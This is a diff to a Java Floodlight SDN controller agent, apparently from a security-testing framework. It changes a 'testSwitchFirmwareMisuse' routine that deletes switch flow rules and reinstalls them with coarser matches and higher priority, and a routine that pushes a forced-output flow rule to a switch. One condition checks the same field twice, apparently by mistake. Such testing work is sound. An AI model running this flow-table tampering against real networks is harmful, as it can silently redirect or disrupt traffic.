@@ -23,6 +23,8 @@ import net.floodlightcontroller.threadpool.IThreadPoolService;
 import org.projectfloodlight.openflow.protocol.*;
 import org.projectfloodlight.openflow.protocol.action.OFAction;
 import org.projectfloodlight.openflow.protocol.action.OFActionOutput;
+import org.projectfloodlight.openflow.protocol.instruction.OFInstruction;
+import org.projectfloodlight.openflow.protocol.instruction.OFInstructionApplyActions;
 import org.projectfloodlight.openflow.protocol.match.Match;
 import org.projectfloodlight.openflow.protocol.match.MatchField;
 import org.projectfloodlight.openflow.types.*;
@@ -546,7 +548,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener {
 
 
     public String testSwitchFirmwareMisuse() {
-        String result = "";
+        String result = "nothing";
 
         List<IOFSwitch> switches = new ArrayList<IOFSwitch>();
         for (DatapathId sw : switchService.getAllSwitchDpids()) {
@@ -563,22 +565,36 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener {
 
                     if (entries != null) {
                         for (OFFlowStatsEntry e : entries) {
-                            OFFlowMod.Builder delete = sw.getOFFactory().buildFlowModify();
-                            delete.setMatch(e.getMatch());
-                            delete.setCookie(e.getCookie());
+                            Match m = e.getMatch();
+                            if (!(m.isExact(MatchField.IN_PORT) &&
+                                    m.isExact(MatchField.ETH_TYPE) &&
+                                    m.isExact(MatchField.ETH_DST) &&
+                                    m.isExact(MatchField.ETH_SRC) &&
+                                    m.isExact(MatchField.IPV4_SRC) &&
+                                    m.isExact(MatchField.IPV4_SRC))) {
+                                continue;
+                            }
 
-                            OFFlowMod.Builder add = sw.getOFFactory().buildFlowAdd();
+                            String ofver = sw.getOFFactory().getVersion().toString();
+
+                            OFFlowDelete.Builder delete = sw.getOFFactory().buildFlowDelete();
+                            delete.setMatch(e.getMatch());
+                            sw.write(delete.build());
+
+                            OFFlowAdd.Builder add = sw.getOFFactory().buildFlowAdd();
+                            add.setPriority(e.getPriority() + 1);
+
                             Match.Builder mb = sw.getOFFactory().buildMatch();
                             mb.setExact(MatchField.ETH_TYPE, EthType.of(0x0800));
                             mb.setExact(MatchField.IN_PORT, e.getMatch().get(MatchField.IN_PORT));
                             mb.setExact(MatchField.IPV4_DST, e.getMatch().get(MatchField.IPV4_DST));
                             mb.setExact(MatchField.IPV4_SRC, e.getMatch().get(MatchField.IPV4_SRC));
 
-                            add.setActions(e.getActions());
                             add.setMatch(mb.build());
-
-                            sw.write(delete.build());
+                            add.setActions(e.getActions());
                             sw.write(add.build());
+
+                            result += add.toString();
                         }
                     }
                 }
@@ -599,12 +615,13 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener {
             of = switchService.getSwitch(sw).getOFFactory();
         }
 
-        if(switches.size() == 0)
+        if (switches.size() == 0)
             return "nothing sw";
 
         Random random = new Random();
 
         OFActionOutput.Builder aob = of.actions().buildOutput();
+        aob.setPort(OFPort.of(2));
         List<OFAction> actions = new ArrayList<OFAction>();
         actions.add(aob.build());
 
@@ -620,9 +637,7 @@ public class AppAgent implements IFloodlightModule, IOFMessageListener {
         fmb.setPriority(555);
 
         OFFlowMod msg = fmb.build();
-        for (IOFSwitch sw : switches) {
-            sw.write(msg);
-        }
+        switches.get(0).write(msg);
 
         return msg.toString();
     }
